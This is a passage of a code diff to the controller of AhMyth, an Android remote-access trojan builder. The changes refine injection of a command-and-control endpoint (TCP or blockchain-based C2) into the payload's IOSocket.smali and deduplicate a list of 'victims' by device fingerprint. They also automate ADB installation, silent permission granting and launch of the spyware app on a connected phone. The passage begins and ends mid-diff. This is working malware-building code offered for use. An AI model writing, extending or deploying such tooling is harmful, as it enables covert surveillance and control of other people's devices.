-                    $appCtrl.blockchainOperatorBalance = 'N/A';
+                    $appCtrl.builder.blockchainOperatorBalance = 'N/A';
                     $appCtrl.Log('[ℹ] No operator address set; skipping operator balance', CONSTANTS.logStatus.INFO);
                 }
-                if ($appCtrl.blockchainClientAddress) {
+                if ($appCtrl.builder.blockchainClientAddress) {
                     try {
-                        const bal = await provider.getBalance(new PublicKey($appCtrl.blockchainClientAddress), 'confirmed');
-                        $appCtrl.blockchainClientBalance = formatSol(bal);
-                        console.log('[refreshBlockchainBalances] Solana Client balance:', $appCtrl.blockchainClientBalance);
+                        const bal = await provider.getBalance(new PublicKey($appCtrl.builder.blockchainClientAddress), 'confirmed');
+                        $appCtrl.builder.blockchainClientBalance = formatSol(bal);
+                        console.log('[refreshBlockchainBalances] Solana Client balance:', $appCtrl.builder.blockchainClientBalance);
                     } catch (e) {
                         console.error('[refreshBlockchainBalances] Client balance error:', e.message);
-                        $appCtrl.blockchainClientBalance = 'Error';
+                        $appCtrl.builder.blockchainClientBalance = 'Error';
                     }
                 } else {
-                    $appCtrl.blockchainClientBalance = 'N/A';
+                    $appCtrl.builder.blockchainClientBalance = 'N/A';
                     $appCtrl.Log('[ℹ] No client address set; skipping client balance', CONSTANTS.logStatus.INFO);
                 }
                 if ($appCtrl.blockchainContract) {
                     try {
                         const bal = await provider.getBalance(new PublicKey($appCtrl.blockchainContract), 'confirmed');
-                        $appCtrl.blockchainChannelBalance = formatSol(bal);
-                        console.log('[refreshBlockchainBalances] Channel balance:', $appCtrl.blockchainChannelBalance);
+                        $appCtrl.builder.blockchainChannelBalance = formatSol(bal);
+                        console.log('[refreshBlockchainBalances] Channel balance:', $appCtrl.builder.blockchainChannelBalance);
                     } catch (e) {
                         console.error('[refreshBlockchainBalances] Channel balance error:', e.message);
-                        $appCtrl.blockchainChannelBalance = 'Error';
+                        $appCtrl.builder.blockchainChannelBalance = 'Error';
                     }
                 } else {
                     $appCtrl.Log('[ℹ] No channel/contract address set; skipping channel balance', CONSTANTS.logStatus.INFO);
@@ -707,8 +991,8 @@ app.controller("AppCtrl", ($scope, $sce) => {
             return;
         }
         try {
-            const rpcToUse = ($appCtrl.blockchainRpcUrl || process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com').trim();
-            const opKey = ($appCtrl.blockchainOperatorPrivateKey || process.env.BLOCKCHAIN_PRIVATE_KEY || '').trim();
+            const rpcToUse = ($appCtrl.builder.blockchainRpcUrl || process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com').trim();
+            const opKey = ($appCtrl.builder.blockchainOperatorPrivateKey || process.env.BLOCKCHAIN_PRIVATE_KEY || '').trim();
             if (!opKey) {
                 $appCtrl.Log('[✗] Operator private key required to deploy contract', CONSTANTS.logStatus.FAIL);
                 return;
@@ -869,8 +1153,18 @@ app.controller("AppCtrl", ($scope, $sce) => {
     async function updateIOSocketTcp(ioPath, ip, port) {
         const content = fs.readFileSync(ioPath, 'utf8');
         const pattern = /http:\/\/[^"\s]+:\d+/;
-        const replaced = content.replace(pattern, `http://${ip}:${port}`);
+        const replacement = `http://${ip}:${port}`;
+        const replaced = content.replace(pattern, replacement);
+        if (replaced === content) {
+            throw new Error(`Could not inject TCP/IP config into IOSocket.smali (pattern not found). Wanted ${replacement}`);
+        }
         fs.writeFileSync(ioPath, replaced, 'utf8');
+        console.log(`[APK Builder] Set TCP/IP endpoint to ${replacement}`);
+        // Verify the write persisted
+        const verify = fs.readFileSync(ioPath, 'utf8');
+        if (!verify.includes(replacement)) {
+            throw new Error(`TCP/IP endpoint verification failed, expected ${replacement} in IOSocket.smali`);
+        }
     }
 
     // Update IOSocket for Blockchain (encode config into placeholder)
@@ -912,7 +1206,54 @@ app.controller("AppCtrl", ($scope, $sce) => {
 
     // Build APK with connection-specific config (TCP or Blockchain)
     $appCtrl.Build = async (ip, port, connectionType, rpcUrl, contract, blockStep, candidates, aesKey, clientKey, chain) => {
+        // Store validated values at function scope to ensure they're used throughout
+        let validatedIp = null;
+        let validatedPort = null;
+        
         try {
+            // Log the exact values received
+            console.log('[APK Builder] Build() called with parameters:');
+            console.log(`  ip: "${ip}" (type: ${typeof ip})`);
+            console.log(`  port: ${port} (type: ${typeof port})`);
+            console.log(`  connectionType: ${connectionType}`);
+            
+            // Validate and sanitize inputs EARLY - ensure GUI values are always used
+            const connectionMode = (connectionType || 'tcp').toLowerCase();
+            
+            // For TCP/IP, validate that IP and port are provided and valid
+            // NO DEFAULTS - must use exact values from GUI
+            if (connectionMode === 'tcp') {
+                // CRITICAL: Use the EXACT values passed as parameters - these come from BuildWithCurrentValues()
+                // which reads directly from $appCtrl.builder.srcIP and $appCtrl.builder.srcPort (the GUI inputs)
+                validatedIp = (ip || '').toString().trim();
+                validatedPort = port !== null && port !== undefined ? Number(port) : null;
+                
+                console.log(`[APK Builder] After sanitization: IP="${validatedIp}", Port=${validatedPort}`);
+                console.log(`[APK Builder] These values came from GUI inputs via BuildWithCurrentValues()`);
+                
+                if (!validatedIp || validatedIp.length === 0) {
+                    throw new Error('Server IP is required for TCP/IP builds. Please enter an IP address in the GUI.');
+                }
+                
+                if (validatedPort === null || validatedPort === undefined || isNaN(validatedPort)) {
+                    throw new Error('Port is required for TCP/IP builds. Please enter a port number in the GUI.');
+                }
+                
+                if (validatedPort <= 0 || validatedPort > 65535) {
+                    throw new Error(`Invalid port number: ${validatedPort}. Port must be between 1 and 65535.`);
+                }
+                
+                // Validate IP format (basic validation)
+                const ipPattern = /^(\d{1,3}\.){3}\d{1,3}$/;
+                if (!ipPattern.test(validatedIp)) {
+                    throw new Error(`Invalid IP address format: ${validatedIp}. Please enter a valid IPv4 address.`);
+                }
+                
+                console.log(`[APK Builder] ✓ Validated TCP/IP config from GUI: ${validatedIp}:${validatedPort}`);
+                console.log(`[APK Builder] These values will be injected into IOSocket.smali`);
+                delayedLog(`[ℹ] Using TCP/IP endpoint from GUI: ${validatedIp}:${validatedPort}`, CONSTANTS.logStatus.INFO);
+            }
+            
             // Initialize build progress
             $appCtrl.buildInProgress = true;
             $appCtrl.buildComplete = false;
@@ -935,12 +1276,25 @@ app.controller("AppCtrl", ($scope, $sce) => {
             delayedLog('[→] Preparing build...', CONSTANTS.logStatus.INFO);
             
             // Get factory path first
-            const { file: ioPath, factoryPath } = await findIOSocketSmali();
+            // Locate Factory path once (we'll re-resolve IOSocket after update-source runs)
+            let { file: ioPath, factoryPath } = await findIOSocketSmali();
             
             // Auto-update Factory source from latest client build
             console.log('[APK Builder] Updating Factory source from latest client build...');
             delayedLog('[→] Updating Factory source from latest client build...', CONSTANTS.logStatus.INFO);
             const updateSourceScript = path.join(factoryPath, 'update-source.ps1');
+            // connectionMode already defined above
+            // Choose the correct client source (TCP vs Blockchain) for the build
+            let clientSourceDir = connectionMode === 'blockchain'
+                ? path.resolve(projectRoot, 'AhMyth-Client-Blockchain')
+                : path.resolve(projectRoot, 'AhMyth-Client');
+            if (!fs.existsSync(clientSourceDir)) {
+                const fallbackDir = path.resolve(projectRoot, 'AhMyth-Client');
+                console.warn(`[APK Builder] Client source not found at ${clientSourceDir}, falling back to ${fallbackDir}`);
+                delayedLog('[⚠] Client source not found, falling back to TCP client', CONSTANTS.logStatus.WARNING);
+                clientSourceDir = fallbackDir;
+            }
+            console.log(`[APK Builder] Using client source: ${clientSourceDir}`);
             if (fs.existsSync(updateSourceScript)) {
                 try {
                     // Use PowerShell to run the script
@@ -958,14 +1312,18 @@ app.controller("AppCtrl", ($scope, $sce) => {
                     
                     const result = await new Promise((resolve, reject) => {
                         const psProcess = spawn('powershell', [
+                            '-NoProfile',
+                            '-NoLogo',
                             '-ExecutionPolicy', 'Bypass',
-                            '-File', updateSourceScript
+                            '-File', updateSourceScript,
+                            '-ConnectionType', connectionMode,
+                            '-ClientPath', clientSourceDir
                         ], {
                             cwd: factoryPath,
                             shell: false,
                             stdio: ['ignore', 'pipe', 'pipe']
                         });
-                        
+                    
                         let stdoutBuffer = '';
                         let stderrBuffer = '';
                         
@@ -1005,8 +1363,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                                 if (trimmed && !trimmed.includes('Profile loaded')) {
                                     // Skip non-fatal PowerShell warnings
                                     if (isNonFatalPowerShellWarning(trimmed)) {
-                                        // Log to console but don't show in GUI
-                                        console.log(`[APK Builder] [PowerShell Warning] ${trimmed}`);
+                                        // Suppress known non-fatal warnings
                                         return;
                                     }
                                     
@@ -1041,8 +1398,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                                 if (trimmed && !trimmed.includes('Profile loaded')) {
                                     // Skip non-fatal PowerShell warnings
                                     if (isNonFatalPowerShellWarning(trimmed)) {
-                                        // Log to console but don't show in GUI
-                                        console.log(`[APK Builder] [PowerShell Warning] ${trimmed}`);
+                                        // Suppress known non-fatal warnings
                                         return;
                                     }
                                     
@@ -1195,6 +1551,16 @@ app.controller("AppCtrl", ($scope, $sce) => {
                 delayedLog('[⚠] update-source.ps1 not found, using existing Factory source', CONSTANTS.logStatus.WARNING);
             }
 
+            // Re-resolve IOSocket.smali in case update-source recreated the folder
+            try {
+                const refreshed = await findIOSocketSmali();
+                ioPath = refreshed.file;
+                factoryPath = refreshed.factoryPath;
+            } catch (err) {
+                console.error('[APK Builder] Failed to re-locate IOSocket.smali after update:', err.message);
+                throw err;
+            }
+
             // Ensure versionCode/versionName are bumped to avoid INSTALL_FAILED_VERSION_DOWNGRADE
             const manifestPath = path.join(factoryPath, 'Ahmyth', 'AndroidManifest.xml');
             if (fs.existsSync(manifestPath)) {
@@ -1231,7 +1597,8 @@ app.controller("AppCtrl", ($scope, $sce) => {
             $appCtrl.buildStatus = 'Injecting configuration...';
             if (!$appCtrl.$$phase) $appCtrl.$apply();
             
-            if (connectionType === 'blockchain') {
+            // Use the validated values from earlier (for TCP/IP) or validate blockchain config
+            if (connectionMode === 'blockchain') {
                 console.log('[APK Builder] Injecting blockchain C2 config...');
                 delayedLog('[→] Injecting blockchain C2 config...', CONSTANTS.logStatus.INFO);
                 if (!rpcUrl || !contract || !aesKey || !clientKey) {
@@ -1245,9 +1612,22 @@ app.controller("AppCtrl", ($scope, $sce) => {
                     chain
                 });
             } else {
-                console.log('[APK Builder] Injecting TCP/IP config...');
-                delayedLog('[→] Injecting TCP/IP config...', CONSTANTS.logStatus.INFO);
-                await updateIOSocketTcp(ioPath, ip, port);
+                // TCP/IP mode - use the EXACT validated values from GUI (no defaults, no fallbacks)
+                if (!validatedIp || !validatedPort) {
+                    throw new Error('TCP/IP configuration validation failed. IP and port must be provided from GUI.');
+                }
+                
+                // CRITICAL: These validatedIp and validatedPort values came from the GUI inputs
+                // They were passed via BuildWithCurrentValues() -> Build() -> validated here
+                console.log('[APK Builder] ========================================');
+                console.log('[APK Builder] Injecting TCP/IP config into IOSocket.smali');
+                console.log(`[APK Builder] FINAL VALUES TO INJECT:`);
+                console.log(`  IP: "${validatedIp}" (from GUI input)`);
+                console.log(`  Port: ${validatedPort} (from GUI input)`);
+                console.log(`  Endpoint: http://${validatedIp}:${validatedPort}`);
+                console.log('[APK Builder] ========================================');
+                delayedLog(`[→] Injecting TCP/IP config: ${validatedIp}:${validatedPort}`, CONSTANTS.logStatus.INFO);
+                await updateIOSocketTcp(ioPath, validatedIp, validatedPort);
             }
 
             // Update progress - Config injected, now building
@@ -1358,20 +1738,117 @@ app.controller("AppCtrl", ($scope, $sce) => {
     $appCtrl.buildStatus = '';
     $appCtrl.buildSteps = [];
 
+    // Helper function to generate a device fingerprint for deduplication
+    const getDeviceFingerprint = (victim) => {
+        if (!victim) return null;
+        // Create a unique identifier based on device characteristics
+        const parts = [
+            victim.manf || victim.manufacturer || '',
+            victim.model || '',
+            victim.release || victim.version || '',
+            victim.device || '',
+            victim.brand || '',
+            victim.product || ''
+        ];
+        return parts.filter(p => p).join('|').toLowerCase();
+    };
+    
+    // Deduplication filter: when same device has both TCP/IP and blockchain entries, only show online one
+    $appCtrl.getFilteredVictims = () => {
+        if (!viclist || typeof viclist !== 'object') return {};
+        
+        const deviceMap = {}; // Map device fingerprint to best victim entry
+        const filtered = {};
+        
+        // First pass: group victims by device fingerprint
+        for (const [id, victim] of Object.entries(viclist)) {
+            if (!victim || victim === -1) continue;
+            
+            const fingerprint = getDeviceFingerprint(victim);
+            if (!fingerprint) {
+                // If we can't create a fingerprint, include it anyway
+                filtered[id] = victim;
+                continue;
+            }
+            
+            if (!deviceMap[fingerprint]) {
+                deviceMap[fingerprint] = [];
+            }
+            deviceMap[fingerprint].push({ id, victim });
+        }
+        
+        // Second pass: for each device, select the best entry
+        for (const [fingerprint, entries] of Object.entries(deviceMap)) {
+            if (entries.length === 1) {
+                // Only one entry, include it
+                filtered[entries[0].id] = entries[0].victim;
+            } else {
+                // Multiple entries for same device - prefer online one
+                // Sort: online first, then by lastSeen (most recent), then prefer blockchain
+                entries.sort((a, b) => {
+                    const aOnline = a.victim.isOnline !== false;
+                    const bOnline = b.victim.isOnline !== false;
+                    
+                    // Prefer online over offline
+                    if (aOnline !== bOnline) {
+                        return bOnline ? 1 : -1;
+                    }
+                    
+                    // If both online or both offline, prefer most recent
+                    const aLastSeen = a.victim.lastSeen || 0;
+                    const bLastSeen = b.victim.lastSeen || 0;
+                    if (aLastSeen !== bLastSeen) {
+                        return bLastSeen - aLastSeen;
+                    }
+                    
+                    // If same timestamp, prefer blockchain connection
+                    const aIsBlockchain = (
+                        a.victim.connectionType === 'blockchain' ||
+                        a.victim.conn === 'blockchain' ||
+                        a.victim.isBlockchain === true ||
+                        a.victim.ip === 'Blockchain' ||
+                        a.victim.country === 'BC'
+                    );
+                    const bIsBlockchain = (
+                        b.victim.connectionType === 'blockchain' ||
+                        b.victim.conn === 'blockchain' ||
+                        b.victim.isBlockchain === true ||
+                        b.victim.ip === 'Blockchain' ||
+                        b.victim.country === 'BC'
+                    );
+                    
+                    if (aIsBlockchain !== bIsBlockchain) {
+                        return bIsBlockchain ? 1 : -1;
+                    }
+                    
+                    // If all else equal, use first one
+                    return 0;
+                });
+                
+                // Use the best entry (first after sorting)
+                filtered[entries[0].id] = entries[0].victim;
+            }
+        }
+        
+        return filtered;
+    };
+    
     // Get victim count
     $appCtrl.getVictimCount = () => {
-        return Object.keys(viclist).length;
+        const filtered = $appCtrl.getFilteredVictims();
+        return Object.keys(filtered).length;
     };
 
     // Get online victim count
     $appCtrl.getOnlineCount = () => {
-        const values = Object.values(viclist || {});
-        return values.filter(v => v && v.isOnline !== false).length;
+        const filtered = $appCtrl.getFilteredVictims();
+        return Object.keys(filtered).filter(key => filtered[key] && filtered[key].isOnline !== false).length;
     };
 
     // Get offline victim count
     $appCtrl.getOfflineCount = () => {
-        return Object.values(viclist).filter(v => v.isOnline === false).length;
+        const filtered = $appCtrl.getFilteredVictims();
+        return Object.keys(filtered).filter(key => filtered[key] && filtered[key].isOnline === false).length;
     };
 
     // Format last seen time
@@ -1440,61 +1917,126 @@ app.controller("AppCtrl", ($scope, $sce) => {
         }
     };
 
-    // Get connected ADB device (prioritizes emulators over real devices)
-    $appCtrl.getConnectedDevice = () => {
+    // Helper function to execute ADB command with timeout
+    const execAdbWithTimeout = (command, timeoutMs = 5000) => {
         return new Promise((resolve, reject) => {
-            const adbPorts = [5037, 5038, 5039, 5040, 5041];
-            const allDevices = []; // Collect all devices from all ports
-            
-            // Helper to check if device ID looks like an emulator
-            const isEmulator = (deviceId) => {
-                return deviceId.startsWith('emulator-') || 
-                       deviceId.match(/^127\.0\.0\.1:\d+$/) ||
-                       deviceId.match(/^localhost:\d+$/) ||
-                       deviceId.match(/^10\.0\.2\.\d+:\d+$/);
-            };
-            
-            const tryPort = (portIndex) => {
-                if (portIndex >= adbPorts.length) {
-                    // All ports checked - now select best device
-                    if (allDevices.length === 0) {
-                        reject(new Error('No ADB device found. Make sure a device/emulator is connected and ADB is running.'));
-                        return;
+            const child = execCallback(command, (err, stdout, stderr) => {
+                clearTimeout(timeout);
+                if (err) {
+                    // Include stderr in error message if available
+                    const errorMsg = stderr ? `${err.message}\n${stderr}` : err.message;
+                    reject(new Error(errorMsg));
+                } else {
+                    // Return stdout, but also include stderr if it contains useful info
+                    const output = stdout || '';
+                    const stderrOutput = stderr || '';
+                    // Some ADB commands output to stderr even on success
+                    if (stderrOutput && !stderrOutput.toLowerCase().includes('error')) {
+                        resolve(output + (output ? '\n' : '') + stderrOutput);
+                    } else {
+                        resolve(output);
                     }
-                    
-                    // Sort devices: emulators first, then real devices
-                    allDevices.sort((a, b) => {
-                        const aIsEmulator = isEmulator(a.deviceId);
-                        const bIsEmulator = isEmulator(b.deviceId);
-                        if (aIsEmulator && !bIsEmulator) return -1;
-                        if (!aIsEmulator && bIsEmulator) return 1;
-                        return 0;
-                    });
-                    
-                    const selected = allDevices[0];
-                    const deviceType = isEmulator(selected.deviceId) ? 'emulator' : 'physical device';
-                    console.log(`[ADB] Selected ${deviceType}: ${selected.deviceId} (from ${allDevices.length} available)`);
-                    resolve(selected);
-                    return;
                 }
-                
-                const port = adbPorts[portIndex];
-                execCallback(`adb -P ${port} devices`, { timeout: 5000 }, (err, stdout) => {
-                    if (!err && stdout) {
-                        const lines = stdout.split('\n').filter(l => l.trim() && !l.includes('List of devices'));
-                        for (const line of lines) {
-                            const match = line.match(/^(\S+)\s+(device|emulator)/);
-                            if (match) {
-                                allDevices.push({ deviceId: match[1], adbPort: port });
+            });
+            
+            // Set timeout
+            const timeout = setTimeout(() => {
+                child.kill();
+                reject(new Error(`Command timed out after ${timeoutMs}ms: ${command}`));
+            }, timeoutMs);
+            
+            child.on('exit', (code) => {
+                clearTimeout(timeout);
+            });
+        });
+    };
+
+    // Get connected ADB device (prioritizes emulators over real devices)
+    $appCtrl.getConnectedDevice = async () => {
+        const adbPorts = [5037, 5038, 5039, 5040, 5041];
+        const allDevices = []; // Collect all devices from all ports
+        
+        // Helper to check if device ID looks like an emulator
+        const isEmulator = (deviceId, deviceInfo = '') => {
+            // Check device ID patterns
+            if (deviceId.startsWith('emulator-')) return true;
+            if (deviceId.match(/^127\.0\.0\.1:\d+$/)) return true;
+            if (deviceId.match(/^localhost:\d+$/)) return true;
+            if (deviceId.match(/^10\.0\.2\.\d+:\d+$/)) return true;
+            
+            // Check device info for emulator indicators
+            const infoLower = deviceInfo.toLowerCase();
+            if (infoLower.includes('emulator') || 
+                infoLower.includes('genymotion') ||
+                infoLower.includes('sdk') ||
+                infoLower.includes('google_sdk') ||
+                infoLower.includes('android_sdk')) {
+                return true;
+            }
+            
+            return false;
+        };
+        
+        // Check all ADB ports
+        for (const port of adbPorts) {
+            try {
+                const stdout = await execAdbWithTimeout(`adb -P ${port} devices`, 3000);
+                if (stdout) {
+                    const lines = stdout.split('\n').filter(l => l.trim() && !l.includes('List of devices'));
+                    for (const line of lines) {
+                        const match = line.match(/^(\S+)\s+(device|emulator)/);
+                        if (match) {
+                            const deviceId = match[1];
+                            let deviceInfo = '';
+                            
+                            // Try to get device info to better detect emulators
+                            try {
+                                deviceInfo = await execAdbWithTimeout(`adb -P ${port} -s ${deviceId} shell getprop ro.product.model`, 2000);
+                            } catch (e) {
+                                // Ignore errors getting device info
+                            }
+                            
+                            // Check if device already added
+                            if (!allDevices.find(d => d.deviceId === deviceId && d.adbPort === port)) {
+                                allDevices.push({ 
+                                    deviceId: deviceId, 
+                                    adbPort: port,
+                                    deviceInfo: (deviceInfo || '').trim()
+                                });
                             }
                         }
                     }
-                    tryPort(portIndex + 1);
-                });
-            };
-            
-            tryPort(0);
+                }
+            } catch (e) {
+                // Port not available or error, continue to next port
+                continue;
+            }
+        }
+        
+        // Check if any devices found
+        if (allDevices.length === 0) {
+            throw new Error('No ADB device found. Make sure a device/emulator is connected and ADB is running.');
+        }
+        
+        // Sort devices: emulators first, then real devices
+        allDevices.sort((a, b) => {
+            const aIsEmulator = isEmulator(a.deviceId, a.deviceInfo || '');
+            const bIsEmulator = isEmulator(b.deviceId, b.deviceInfo || '');
+            if (aIsEmulator && !bIsEmulator) return -1; // Emulator comes first
+            if (!aIsEmulator && bIsEmulator) return 1;
+            return 0;
         });
+        
+        const selected = allDevices[0];
+        const deviceType = isEmulator(selected.deviceId, selected.deviceInfo || '') ? 'emulator' : 'physical device';
+        console.log(`[ADB] Selected ${deviceType}: ${selected.deviceId} (from ${allDevices.length} available device(s))`);
+        $appCtrl.Log(`[ℹ] Found ${allDevices.length} device(s), selected ${deviceType}: ${selected.deviceId}`, CONSTANTS.logStatus.INFO);
+        if (allDevices.length > 1) {
+            const otherDevices = allDevices.slice(1).map(d => `${d.deviceId} (${isEmulator(d.deviceId, d.deviceInfo || '') ? 'emulator' : 'device'})`).join(', ');
+            console.log(`[ADB] Other available devices: ${otherDevices}`);
+        }
+        
+        return selected;
     };
 
     // Install APK on connected device (and run it)
@@ -1510,9 +2052,13 @@ app.controller("AppCtrl", ($scope, $sce) => {
         }
         
         $appCtrl.Log(`[→] Installing APK: ${path.basename(apkPath)}...`, CONSTANTS.logStatus.INFO);
+        console.log('[Install] Starting installation process...');
         
         try {
+            $appCtrl.Log('[→] Detecting connected devices...', CONSTANTS.logStatus.INFO);
+            console.log('[Install] Getting connected device...');
             const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
+            console.log(`[Install] Device selected: ${deviceId} on port ${adbPort}`);
             const isEmulator = deviceId.startsWith('emulator-') || 
                                deviceId.match(/^127\.0\.0\.1:\d+$/) ||
                                deviceId.match(/^localhost:\d+$/) ||
@@ -1522,25 +2068,59 @@ app.controller("AppCtrl", ($scope, $sce) => {
             
             // Uninstall old version first (ignore errors)
             $appCtrl.Log('[→] Uninstalling previous version...', CONSTANTS.logStatus.INFO);
-            await new Promise(resolve => {
-                execCallback(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, { timeout: 10000 }, () => resolve());
-            });
+            try {
+                await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, 10000);
+            } catch (e) {
+                // Ignore uninstall errors
+            }
             
-            // Install with downgrade flag
-            $appCtrl.Log('[→] Installing APK...', CONSTANTS.logStatus.INFO);
+            // Verify device is still connected before installing
+            $appCtrl.Log('[→] Verifying device connection...', CONSTANTS.logStatus.INFO);
+            try {
+                const state = await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} get-state`, 5000);
+                if (!state || !state.trim().includes('device')) {
+                    throw new Error(`Device ${deviceId} is not connected or not ready (state: ${state.trim()})`);
+                }
+            } catch (e) {
+                throw new Error(`Device ${deviceId} verification failed: ${e.message}`);
+            }
+            
+            // Install with downgrade flag and better error handling
+            $appCtrl.Log('[→] Installing APK (this may take up to 2 minutes)...', CONSTANTS.logStatus.INFO);
             const installCmd = `adb -P ${adbPort} -s ${deviceId} install --no-incremental -r -d "${apkPath}"`;
             
-            await new Promise((resolve, reject) => {
-                execCallback(installCmd, { timeout: 120000 }, (err, stdout, stderr) => {
-                    if (err) {
-                        reject(new Error(`Install failed: ${err.message}`));
-                        return;
+            try {
+                const output = await execAdbWithTimeout(installCmd, 120000);
+                const outputLower = output.toLowerCase();
+                
+                // Check for success indicators
+                if (outputLower.includes('success') || outputLower.includes('performing streamed install')) {
+                    $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
+                } else if (outputLower.includes('failure') || outputLower.includes('error')) {
+                    // Check for common non-fatal errors
+                    if (outputLower.includes('install_failed_already_exists') || 
+                        outputLower.includes('install_failed_version_downgrade')) {
+                        $appCtrl.Log('[ℹ] Package already installed or version conflict, continuing...', CONSTANTS.logStatus.INFO);
+                    } else {
+                        throw new Error(`Install failed: ${output}`);
                     }
-                    resolve();
-                });
-            });
+                } else {
+                    // Assume success if no clear error
+                }
+            } catch (e) {
+                if (e.message.includes('timed out')) {
+                    throw new Error('Installation timed out after 120 seconds. The device may be unresponsive or the APK may be too large.');
+                }
+                const errorMsg = e.message || e.toString();
+                // Check for common non-fatal errors
+                if (errorMsg.toLowerCase().includes('install_failed_already_exists') || 
+                    errorMsg.toLowerCase().includes('install_failed_version_downgrade')) {
+                    $appCtrl.Log('[ℹ] Package already installed or version conflict, continuing...', CONSTANTS.logStatus.INFO);
+                } else {
+                    throw new Error(`Install failed: ${errorMsg}`);
+                }
+            }
             
-            $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
             
             // Grant permissions
             $appCtrl.Log('[→] Granting permissions...', CONSTANTS.logStatus.INFO);
@@ -1556,24 +2136,26 @@ app.controller("AppCtrl", ($scope, $sce) => {
             ];
             
             for (const perm of permissions) {
-                await new Promise(resolve => {
-                    execCallback(`adb -P ${adbPort} -s ${deviceId} shell pm grant ahmyth.mine.king.ahmyth ${perm}`, { timeout: 5000 }, () => resolve());
-                });
+                try {
+                    await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell pm grant ahmyth.mine.king.ahmyth ${perm}`, 5000);
+                } catch (e) {
+                    // Ignore permission grant errors (some permissions may not be grantable)
+                }
             }
             $appCtrl.Log('[✓] Permissions granted', CONSTANTS.logStatus.SUCCESS);
             
             // Launch the app
             $appCtrl.Log('[→] Launching app...', CONSTANTS.logStatus.INFO);
-            await new Promise((resolve) => {
-                execCallback(`adb -P ${adbPort} -s ${deviceId} shell am start -n ahmyth.mine.king.ahmyth/.MainActivity`, { timeout: 10000 }, (err) => {
-                    if (err) {
-                        // Try alternative launch method
-                        execCallback(`adb -P ${adbPort} -s ${deviceId} shell monkey -p ahmyth.mine.king.ahmyth -c android.intent.category.LAUNCHER 1`, { timeout: 10000 }, () => resolve());
-                    } else {
-                        resolve();
-                    }
-                });
-            });
+            try {
+                await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell am start -n ahmyth.mine.king.ahmyth/.MainActivity`, 10000);
+            } catch (e) {
+                // Try alternative launch method
+                try {
+                    await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell monkey -p ahmyth.mine.king.ahmyth -c android.intent.category.LAUNCHER 1`, 10000);
+                } catch (e2) {
+                    $appCtrl.Log('[⚠] Failed to launch app automatically, but installation succeeded', CONSTANTS.logStatus.WARNING);
+                }
+            }
             
             $appCtrl.Log('[✓] App launched successfully!', CONSTANTS.logStatus.SUCCESS);
             $appCtrl.Log('[ℹ] Waiting for device to connect...', CONSTANTS.logStatus.INFO);
@@ -1610,25 +2192,60 @@ app.controller("AppCtrl", ($scope, $sce) => {
             
             // Uninstall old version first (ignore errors)
             $appCtrl.Log('[→] Uninstalling previous version...', CONSTANTS.logStatus.INFO);
-            await new Promise(resolve => {
-                execCallback(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, { timeout: 10000 }, () => resolve());
-            });
+            try {
+                await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, 10000);
+            } catch (e) {
+                // Ignore uninstall errors
+            }
             
-            // Install with downgrade flag
-            $appCtrl.Log('[→] Installing APK...', CONSTANTS.logStatus.INFO);
+            // Verify device is still connected before installing
+            $appCtrl.Log('[→] Verifying device connection...', CONSTANTS.logStatus.INFO);
+            try {
+                const state = await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} get-state`, 5000);
+                if (!state || !state.trim().includes('device')) {
+                    throw new Error(`Device ${deviceId} is not connected or not ready (state: ${state.trim()})`);
+                }
+            } catch (e) {
+                throw new Error(`Device ${deviceId} verification failed: ${e.message}`);
+            }
+            
+            // Install with downgrade flag and better error handling
+            $appCtrl.Log('[→] Installing APK (this may take up to 2 minutes)...', CONSTANTS.logStatus.INFO);
             const installCmd = `adb -P ${adbPort} -s ${deviceId} install --no-incremental -r -d "${$appCtrl.lastBuiltApkPath}"`;
             
-            await new Promise((resolve, reject) => {
-                execCallback(installCmd, { timeout: 120000 }, (err, stdout, stderr) => {
-                    if (err) {
-                        reject(new Error(`Install failed: ${err.message}`));
-                        return;
+            try {
+                const output = await execAdbWithTimeout(installCmd, 120000);
+                const outputLower = output.toLowerCase();
+                
+                // Check for success indicators
+                if (outputLower.includes('success') || outputLower.includes('performing streamed install')) {
+                    $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
+                } else if (outputLower.includes('failure') || outputLower.includes('error')) {
+                    // Check for common non-fatal errors
+                    if (outputLower.includes('install_failed_already_exists') || 
+                        outputLower.includes('install_failed_version_downgrade')) {
+                        $appCtrl.Log('[ℹ] Package already installed or version conflict, continuing...', CONSTANTS.logStatus.INFO);
+                    } else {
+                        throw new Error(`Install failed: ${output}`);
                     }
-                    resolve();
-                });
-            });
+                } else {
+                    // Assume success if no clear error
+                    $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
+                }
+            } catch (e) {
+                if (e.message.includes('timed out')) {
+                    throw new Error('Installation timed out after 120 seconds. The device may be unresponsive or the APK may be too large.');
+                }
+                const errorMsg = e.message || e.toString();
+                // Check for common non-fatal errors
+                if (errorMsg.toLowerCase().includes('install_failed_already_exists') || 
+                    errorMsg.toLowerCase().includes('install_failed_version_downgrade')) {
+                    $appCtrl.Log('[ℹ] Package already installed or version conflict, continuing...', CONSTANTS.logStatus.INFO);
+                } else {
+                    throw new Error(`Install failed: ${errorMsg}`);
+                }
+            }
             
-            $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
             
             // Grant permissions
             $appCtrl.Log('[→] Granting permissions...', CONSTANTS.logStatus.INFO);
@@ -1644,27 +2261,26 @@ app.controller("AppCtrl", ($scope, $sce) => {
             ];
             
             for (const perm of permissions) {
-                await new Promise(resolve => {
